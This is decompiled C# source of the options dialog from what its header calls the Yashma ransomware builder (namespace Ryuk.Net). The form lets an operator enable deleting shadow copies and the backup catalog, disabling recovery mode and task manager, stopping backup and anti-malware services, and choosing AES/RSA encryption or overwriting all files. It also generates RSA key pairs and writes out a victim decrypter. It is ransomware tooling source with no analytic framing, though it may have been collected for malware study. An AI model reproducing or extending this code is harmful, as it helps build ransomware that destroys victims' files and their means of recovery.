// Decompiled with JetBrains decompiler
// Type: Ryuk.Net.advancedSettingForm
// Assembly: Yashma ransomware builder v1.2, Version=2.0.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 22C18137-3576-4359-994F-BB1A6613DCFC
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-VirTool.MSIL.Agent.gen-f9a5a72ead096594c5d59abe706e3716f6000c3b4ebd7690f2eb114a37d1a7db.exe

using CustomWindowsForm;
using Ryuk.Net.Properties;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;

namespace Ryuk.Net
{
  public class advancedSettingForm : Form
  {
    private bool mouseDown;
    private Point lastLocation;
    private IContainer components = (IContainer) null;
    private Panel panel1;
    private ButtonZ buttonZ1;
    private CheckBox deleteBackupCatalogCheckbox;
    private CheckBox disableRecoveryModeCheckbox;
    private CheckBox deleteShadowCopiesCheckbox;
    private CheckBox resistAdminCheckbox;
    private Label label1;
    private OpenFileDialog openFileDialog1;
    private Label pathToXmlLabel;
    private Button button2;
    private TextBox textBox1;
    private Label label2;
    private Label label3;
    private TextBox pathToImageText;
    private Button button1;
    private RadioButton radioButton2;
    private RadioButton radioButton1;
    private Label overwriteInfoLabel;
    private CheckBox taskManager;
    private CheckBox stopBackupsCheckbox;

    public advancedSettingForm() => this.InitializeComponent();

    private void advancedSettingForm_Load(object sender, EventArgs e)
    {
      this.resistAdminCheckbox.Checked = Settings.Default.checkAdminPrivilage;
      bool encryptOption = Settings.Default.encryptOption;
      string decrypterName = Settings.Default.decrypterName;
      if (decrypterName == "")
      {
        this.textBox1.Enabled = true;
      }
      else
      {
        this.textBox1.Text = decrypterName;
        this.textBox1.Enabled = false;
        this.button2.Text = "Public key selected";
      }
      string pathToBase64 = Settings.Default.pathToBase64;
      if (!(pathToBase64 != ""))
        return;
      this.pathToImageText.Text = pathToBase64;
    }

    private void buttonZ1_Click(object sender, EventArgs e) => this.Close();

    private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
    {
      this.mouseDown = true;
      this.lastLocation = e.Location;
    }

    private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.mouseDown)
        return;
      Point location = this.Location;
      int x = location.X - this.lastLocation.X + e.X;
      location = this.Location;
      int y = location.Y - this.lastLocation.Y + e.Y;
      this.Location = new Point(x, y);
      this.Update();
    }

    private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e) => this.mouseDown = false;

    private void buttonZ1_Click_1(object sender, EventArgs e) => this.Close();

    private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
    {
      if (this.resistAdminCheckbox.Checked)
      {
        Settings.Default.checkAdminPrivilage = true;
        this.deleteShadowCopiesCheckbox.Enabled = true;
        this.disableRecoveryModeCheckbox.Enabled = true;
        this.deleteBackupCatalogCheckbox.Enabled = true;
        this.deleteShadowCopiesCheckbox.Checked = true;
        this.disableRecoveryModeCheckbox.Checked = true;
        this.deleteBackupCatalogCheckbox.Checked = true;
        this.taskManager.Checked = true;
        this.taskManager.Enabled = true;
        this.stopBackupsCheckbox.Checked = true;
        this.stopBackupsCheckbox.Enabled = true;
      }
      else
      {
        Settings.Default.checkAdminPrivilage = false;
        this.deleteShadowCopiesCheckbox.Enabled = false;
        this.disableRecoveryModeCheckbox.Enabled = false;
        this.deleteBackupCatalogCheckbox.Enabled = false;
        this.deleteShadowCopiesCheckbox.Checked = false;
        this.disableRecoveryModeCheckbox.Checked = false;
        this.deleteBackupCatalogCheckbox.Checked = false;
        this.taskManager.Checked = false;
        this.taskManager.Enabled = false;
        this.stopBackupsCheckbox.Checked = false;
        this.stopBackupsCheckbox.Enabled = false;
      }
    }

    private void panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void panel1_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.mouseDown)
        return;
      Point location = this.Location;
      int x = location.X - this.lastLocation.X + e.X;
      location = this.Location;
      int y = location.Y - this.lastLocation.Y + e.Y;
      this.Location = new Point(x, y);
      this.Update();
    }

    private void panel1_MouseUp(object sender, MouseEventArgs e) => this.mouseDown = false;

    private void panel1_MouseDown(object sender, MouseEventArgs e)
    {
      this.mouseDown = true;
      this.lastLocation = e.Location;
    }

    private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
    {
      if (this.deleteShadowCopiesCheckbox.Checked)
        Settings.Default.deleteShadowCopies = true;
      else
        Settings.Default.deleteShadowCopies = false;
    }

    private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
    {
      if (this.deleteBackupCatalogCheckbox.Checked)
        Settings.Default.deleteBackupCatalog = true;
      else
        Settings.Default.deleteBackupCatalog = false;
    }

    private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
    {
      if (this.disableRecoveryModeCheckbox.Checked)
        Settings.Default.disableRecoveryMode = true;
      else
        Settings.Default.disableRecoveryMode = false;
    }

    private void radioButton1_CheckedChanged(object sender, EventArgs e)
    {
      this.button2.Visible = false;
      this.textBox1.Visible = false;
      this.label2.Visible = false;
      this.overwriteInfoLabel.Text = "This function works faster but files cannot be returned ";
      Settings.Default.encryptOption = false;
    }

    private void radioButton2_CheckedChanged(object sender, EventArgs e)
    {
      this.button2.Visible = true;
      this.textBox1.Visible = true;
      this.label2.Visible = true;
      this.overwriteInfoLabel.Text = "Files will be encrypted with AES / RSA method ";
      Settings.Default.encryptOption = true;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.FilterIndex = 1;
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      string fileName = openFileDialog.FileName;
      this.textBox1.Text = Path.GetFileName(fileName);
      int num = (int) MessageBox.Show(fileName);
    }

    private void decrypter(string decrypter)
    {
    }

    private void button2_Click(object sender, EventArgs e)
    {
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048);
      RSAParameters publicKey = cryptoServiceProvider.ExportParameters(true);
      string keyString1 = advancedSettingForm.GetKeyString(cryptoServiceProvider.ExportParameters(false));
      string keyString2 = advancedSettingForm.GetKeyString(publicKey);
      string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
      if (this.textBox1.Text.Contains("-decrypter"))
      {
        string text = this.textBox1.Text;
        if (text == "")
        {
          int num1 = (int) MessageBox.Show("Decrypter name field is empty!");
        }
        else if (Directory.Exists(text))
        {
          Settings.Default.publicKey = File.ReadAllText(directoryName + "\\" + text + "\\publicKey.yashma");
          Settings.Default.decrypterName = text;
          int num2 = (int) MessageBox.Show("Public key selected successfully!");
          this.textBox1.Text = text;
          this.textBox1.Enabled = false;
          this.button2.Text = "Public key selected";
        }
        else
        {
          try
          {
            Directory.CreateDirectory(text);
            string path1 = directoryName + "\\" + text + "\\publicKey.yashma";
            string path2 = directoryName + "\\" + text + "\\privateKey.yashma";
            File.WriteAllText(path1, keyString1);
            File.WriteAllText(path2, keyString2);
            byte[] decrypter = Resources.decrypter;
            File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", decrypter);
            Settings.Default.publicKey = File.ReadAllText(path1);
            Settings.Default.decrypterName = text;
            int num3 = (int) MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
            this.textBox1.Text = text;
            this.textBox1.Enabled = false;
            this.button2.Text = "Public key selected";
          }
          catch
          {
            int num4 = (int) MessageBox.Show("Unexpected error occured");
          }
        }
      }
      else
      {
        string path3 = this.textBox1.Text + "-decrypter";
        if (path3 == "-decrypter")
        {
          int num5 = (int) MessageBox.Show("Decrypter name field is empty!");
        }
        else if (Directory.Exists(path3) || Directory.Exists(path3 + "-decrypter"))
        {
          Settings.Default.publicKey = File.ReadAllText(directoryName + "\\" + path3 + "\\publicKey.yashma");
          Settings.Default.decrypterName = path3;
          int num6 = (int) MessageBox.Show("Decrypter exists. Public key selected successfully!");
          this.textBox1.Text = path3;
          this.textBox1.Enabled = false;
          this.button2.Text = "Public key selected";
        }
        else
        {
          try
          {
            Directory.CreateDirectory(path3);
            string path4 = directoryName + "\\" + path3 + "\\publicKey.yashma";
            string path5 = directoryName + "\\" + path3 + "\\privateKey.yashma";
            File.WriteAllText(path4, keyString1);
            File.WriteAllText(path5, keyString2);
            byte[] decrypter = Resources.decrypter;
            File.WriteAllBytes(directoryName + "\\" + path3 + "\\Decrypter.exe", decrypter);
            Settings.Default.publicKey = File.ReadAllText(path4);
            Settings.Default.decrypterName = path3;
            int num7 = (int) MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
            this.textBox1.Text = path3;
            this.textBox1.Enabled = false;
            this.button2.Text = "Public key selected";
          }
          catch
          {
            int num8 = (int) MessageBox.Show("Unexpected error occured");
          }
        }
      }
    }

    public static string GetKeyString(RSAParameters publicKey)
    {
      StringWriter stringWriter = new StringWriter();
      new XmlSerializer(typeof (RSAParameters)).Serialize((TextWriter) stringWriter, (object) publicKey);
      return stringWriter.ToString();
    }

    private void pathToXmlLabel_Click(object sender, EventArgs e)
    {
    }

    private void overwriteInfoLabel_Click(object sender, EventArgs e)
    {
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void label2_Click(object sender, EventArgs e)
    {
    }

    private void button1_Click_1(object sender, EventArgs e)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        this.pathToImageText.Text = openFileDialog.FileName;
        string base64String = Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName));
        Settings.Default.base64Image = base64String;
        Settings.Default.pathToBase64 = openFileDialog.FileName;
        File.WriteAllText(folderPath + "/sdf.txt", base64String);
      }
      catch (Exception ex)
      {
        throw new ApplicationException("Failed loading image");
      }
    }

    private void taskManager_CheckedChanged(object sender, EventArgs e)
    {
      if (this.taskManager.Checked)
        Settings.Default.disableTaskManager = true;
      else
        Settings.Default.disableTaskManager = false;
    }

    private void stopBackupsCheckbox_CheckedChanged(object sender, EventArgs e)
    {
      if (this.stopBackupsCheckbox.Checked)
        Settings.Default.stopBackupServices = true;
      else
        Settings.Default.stopBackupServices = false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.panel1 = new Panel();
      this.stopBackupsCheckbox = new CheckBox();
      this.taskManager = new CheckBox();
      this.label3 = new Label();
      this.pathToImageText = new TextBox();
      this.button1 = new Button();
      this.label2 = new Label();
      this.textBox1 = new TextBox();
      this.button2 = new Button();
      this.pathToXmlLabel = new Label();
      this.overwriteInfoLabel = new Label();
      this.radioButton2 = new RadioButton();
      this.radioButton1 = new RadioButton();
      this.label1 = new Label();
      this.deleteBackupCatalogCheckbox = new CheckBox();
      this.disableRecoveryModeCheckbox = new CheckBox();
      this.deleteShadowCopiesCheckbox = new CheckBox();
      this.resistAdminCheckbox = new CheckBox();
      this.openFileDialog1 = new OpenFileDialog();
      this.buttonZ1 = new ButtonZ();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.panel1.BackColor = Color.FromArgb(30, 30, 30);
      this.panel1.Controls.Add((Control) this.stopBackupsCheckbox);
      this.panel1.Controls.Add((Control) this.taskManager);
      this.panel1.Controls.Add((Control) this.label3);
      this.panel1.Controls.Add((Control) this.pathToImageText);
      this.panel1.Controls.Add((Control) this.button1);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Controls.Add((Control) this.textBox1);
      this.panel1.Controls.Add((Control) this.button2);
      this.panel1.Controls.Add((Control) this.pathToXmlLabel);
      this.panel1.Controls.Add((Control) this.overwriteInfoLabel);
      this.panel1.Controls.Add((Control) this.radioButton2);
      this.panel1.Controls.Add((Control) this.radioButton1);
      this.panel1.Controls.Add((Control) this.label1);
      this.panel1.Controls.Add((Control) this.buttonZ1);
      this.panel1.Controls.Add((Control) this.deleteBackupCatalogCheckbox);
      this.panel1.Controls.Add((Control) this.disableRecoveryModeCheckbox);
      this.panel1.Controls.Add((Control) this.deleteShadowCopiesCheckbox);
      this.panel1.Controls.Add((Control) this.resistAdminCheckbox);
      this.panel1.Location = new Point(2, 1);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(352, 459);
      this.panel1.TabIndex = 11;
      this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
      this.panel1.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
      this.panel1.MouseMove += new MouseEventHandler(this.panel1_MouseMove);
      this.panel1.MouseUp += new MouseEventHandler(this.panel1_MouseUp);
      this.stopBackupsCheckbox.AutoSize = true;
      this.stopBackupsCheckbox.Cursor = Cursors.Hand;
      this.stopBackupsCheckbox.Enabled = false;
      this.stopBackupsCheckbox.ForeColor = Color.White;
      this.stopBackupsCheckbox.Location = new Point(70, 225);
      this.stopBackupsCheckbox.Name = "stopBackupsCheckbox";
      this.stopBackupsCheckbox.Size = new Size(212, 17);
      this.stopBackupsCheckbox.TabIndex = 35;
      this.stopBackupsCheckbox.Text = "Stop backup and anti malware services";
      this.stopBackupsCheckbox.UseVisualStyleBackColor = true;
      this.stopBackupsCheckbox.CheckedChanged += new EventHandler(this.stopBackupsCheckbox_CheckedChanged);
      this.taskManager.AutoSize = true;
      this.taskManager.Cursor = Cursors.Hand;
      this.taskManager.Enabled = false;
      this.taskManager.ForeColor = Color.White;
      this.taskManager.Location = new Point(70, 189);
      this.taskManager.Name = "taskManager";
      this.taskManager.Size = new Size(128, 17);
      this.taskManager.TabIndex = 34;
      this.taskManager.Text = "Disable task manager";
      this.taskManager.UseVisualStyleBackColor = true;
      this.taskManager.CheckedChanged += new EventHandler(this.taskManager_CheckedChanged);
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.White;
      this.label3.Location = new Point(19, 276);
      this.label3.Name = "label3";
      this.label3.Size = new Size(169, 16);
      this.label3.TabIndex = 33;
      this.label3.Text = "Change desktop wallpaper";
      this.pathToImageText.BackColor = Color.FromArgb(30, 30, 30);
      this.pathToImageText.ForeColor = Color.White;
      this.pathToImageText.Location = new Point(21, 299);
      this.pathToImageText.Name = "pathToImageText";
      this.pathToImageText.Size = new Size(205, 20);
      this.pathToImageText.TabIndex = 32;
      this.button1.BackColor = Color.FromArgb(30, 30, 30);
      this.button1.Cursor = Cursors.Hand;
      this.button1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.button1.ForeColor = Color.White;
      this.button1.Location = new Point(232, 295);
      this.button1.Name = "button1";
      this.button1.Size = new Size(110, 26);
      this.button1.TabIndex = 31;
      this.button1.Text = "Select Image";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click_1);
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = Color.White;
      this.label2.Location = new Point(19, 391);
      this.label2.Name = "label2";
      this.label2.Size = new Size(107, 16);
      this.label2.TabIndex = 30;
      this.label2.Text = "Decrypter Name";
      this.label2.Click += new EventHandler(this.label2_Click);
      this.textBox1.BackColor = Color.FromArgb(30, 30, 30);
      this.textBox1.ForeColor = Color.White;
      this.textBox1.Location = new Point(22, 410);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(159, 20);
      this.textBox1.TabIndex = 29;
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.button2.BackColor = Color.FromArgb(30, 30, 30);
      this.button2.Cursor = Cursors.Hand;
      this.button2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.button2.ForeColor = Color.White;
      this.button2.Location = new Point(206, 404);
      this.button2.Name = "button2";
      this.button2.Size = new Size(136, 26);
      this.button2.TabIndex = 28;
      this.button2.Text = "Create Decrypter";
      this.button2.UseVisualStyleBackColor = false;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.pathToXmlLabel.AutoSize = true;
      this.pathToXmlLabel.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.pathToXmlLabel.ForeColor = Color.White;
      this.pathToXmlLabel.Location = new Point(24, 355);
      this.pathToXmlLabel.Name = "pathToXmlLabel";
      this.pathToXmlLabel.Size = new Size(0, 16);
      this.pathToXmlLabel.TabIndex = 26;
      this.pathToXmlLabel.Click += new EventHandler(this.pathToXmlLabel_Click);
      this.overwriteInfoLabel.AutoSize = true;
      this.overwriteInfoLabel.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.overwriteInfoLabel.ForeColor = Color.White;
      this.overwriteInfoLabel.Location = new Point(22, 365);
      this.overwriteInfoLabel.Name = "overwriteInfoLabel";
      this.overwriteInfoLabel.Size = new Size(275, 16);
      this.overwriteInfoLabel.TabIndex = 24;
      this.overwriteInfoLabel.Text = "Files will be encrypted with AES/RSA method";
      this.overwriteInfoLabel.Click += new EventHandler(this.overwriteInfoLabel_Click);
      this.radioButton2.AutoSize = true;
      this.radioButton2.Checked = true;
      this.radioButton2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.radioButton2.ForeColor = Color.White;
      this.radioButton2.Location = new Point(206, 345);
      this.radioButton2.Name = "radioButton2";
      this.radioButton2.Size = new Size(142, 20);
      this.radioButton2.TabIndex = 23;
      this.radioButton2.TabStop = true;
      this.radioButton2.Text = "Encrypt  AES / RSA";
      this.radioButton2.UseVisualStyleBackColor = true;
      this.radioButton2.Visible = false;
      this.radioButton2.CheckedChanged += new EventHandler(this.radioButton2_CheckedChanged);
      this.radioButton1.AutoSize = true;
      this.radioButton1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.radioButton1.ForeColor = Color.White;
      this.radioButton1.Location = new Point(30, 345);
      this.radioButton1.Name = "radioButton1";
      this.radioButton1.Size = new Size(126, 20);
      this.radioButton1.TabIndex = 22;
      this.radioButton1.Text = "Overwrite all files";
      this.radioButton1.UseVisualStyleBackColor = true;
      this.radioButton1.Visible = false;
      this.radioButton1.CheckedChanged += new EventHandler(this.radioButton1_CheckedChanged);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 20.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = Color.White;
      this.label1.Location = new Point(5, 8);
      this.label1.Name = "label1";
      this.label1.Size = new Size(301, 31);
      this.label1.TabIndex = 21;
      this.label1.Text = "Decrypter and options";
      this.deleteBackupCatalogCheckbox.AutoSize = true;
      this.deleteBackupCatalogCheckbox.Cursor = Cursors.Hand;
      this.deleteBackupCatalogCheckbox.Enabled = false;
      this.deleteBackupCatalogCheckbox.ForeColor = Color.White;
      this.deleteBackupCatalogCheckbox.Location = new Point(70, 120);
      this.deleteBackupCatalogCheckbox.Name = "deleteBackupCatalogCheckbox";
      this.deleteBackupCatalogCheckbox.Size = new Size(152, 17);
      this.deleteBackupCatalogCheckbox.TabIndex = 19;
      this.deleteBackupCatalogCheckbox.Text = "Delete the backup catalog";
      this.deleteBackupCatalogCheckbox.UseVisualStyleBackColor = true;
      this.deleteBackupCatalogCheckbox.CheckedChanged += new EventHandler(this.deleteBackupCatalogCheckbox_CheckedChanged);
      this.disableRecoveryModeCheckbox.AutoSize = true;
      this.disableRecoveryModeCheckbox.Cursor = Cursors.Hand;
      this.disableRecoveryModeCheckbox.Enabled = false;
      this.disableRecoveryModeCheckbox.ForeColor = Color.White;
      this.disableRecoveryModeCheckbox.Location = new Point(70, 155);
      this.disableRecoveryModeCheckbox.Name = "disableRecoveryModeCheckbox";
      this.disableRecoveryModeCheckbox.Size = new Size(178, 17);
      this.disableRecoveryModeCheckbox.TabIndex = 18;
      this.disableRecoveryModeCheckbox.Text = "Disable windows recovery mode";
      this.disableRecoveryModeCheckbox.UseVisualStyleBackColor = true;
      this.disableRecoveryModeCheckbox.CheckedChanged += new EventHandler(this.disableRecoveryModeCheckbox_CheckedChanged);
      this.deleteShadowCopiesCheckbox.AutoSize = true;
      this.deleteShadowCopiesCheckbox.Cursor = Cursors.Hand;
      this.deleteShadowCopiesCheckbox.Enabled = false;
      this.deleteShadowCopiesCheckbox.ForeColor = Color.White;
      this.deleteShadowCopiesCheckbox.Location = new Point(70, 84);
      this.deleteShadowCopiesCheckbox.Name = "deleteShadowCopiesCheckbox";
      this.deleteShadowCopiesCheckbox.Size = new Size(190, 17);
      this.deleteShadowCopiesCheckbox.TabIndex = 17;
      this.deleteShadowCopiesCheckbox.Text = "Delete all Volumes Shadow Copies";
      this.deleteShadowCopiesCheckbox.UseVisualStyleBackColor = true;
      this.deleteShadowCopiesCheckbox.CheckedChanged += new EventHandler(this.deleteShadowCopiesCheckbox_CheckedChanged);
      this.resistAdminCheckbox.AutoSize = true;
      this.resistAdminCheckbox.Cursor = Cursors.Hand;
      this.resistAdminCheckbox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.resistAdminCheckbox.ForeColor = Color.White;
      this.resistAdminCheckbox.Location = new Point(57, 52);
      this.resistAdminCheckbox.Name = "resistAdminCheckbox";
      this.resistAdminCheckbox.Size = new Size(212, 20);
      this.resistAdminCheckbox.TabIndex = 16;
      this.resistAdminCheckbox.Text = "Resist for admin privileges";
      this.resistAdminCheckbox.UseVisualStyleBackColor = true;
      this.resistAdminCheckbox.CheckedChanged += new EventHandler(this.resistAdminCheckbox_CheckedChanged);
      this.openFileDialog1.FileName = "openFileDialog1";
      this.buttonZ1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
      this.buttonZ1.DisplayText = "X";
      this.buttonZ1.FlatStyle = FlatStyle.Flat;
      this.buttonZ1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.buttonZ1.ForeColor = Color.White;
      this.buttonZ1.Location = new Point(321, 0);
      this.buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
      this.buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
      this.buttonZ1.Name = "buttonZ1";
      this.buttonZ1.Size = new Size(31, 24);
      this.buttonZ1.TabIndex = 20;
      this.buttonZ1.Text = "X";
      this.buttonZ1.TextLocation_X = 6;
      this.buttonZ1.TextLocation_Y = 1;
      this.buttonZ1.UseVisualStyleBackColor = true;
      this.buttonZ1.Click += new EventHandler(this.buttonZ1_Click_1);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(25, 25, 25);
      this.ClientSize = new Size(356, 461);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (advancedSettingForm);
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (advancedSettingForm);
      this.Load += new EventHandler(this.advancedSettingForm_Load);
      this.MouseDown += new MouseEventHandler(this.advancedSettingForm_MouseDown);
      this.MouseMove += new MouseEventHandler(this.advancedSettingForm_MouseMove);
      this.MouseUp += new MouseEventHandler(this.advancedSettingForm_MouseUp);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
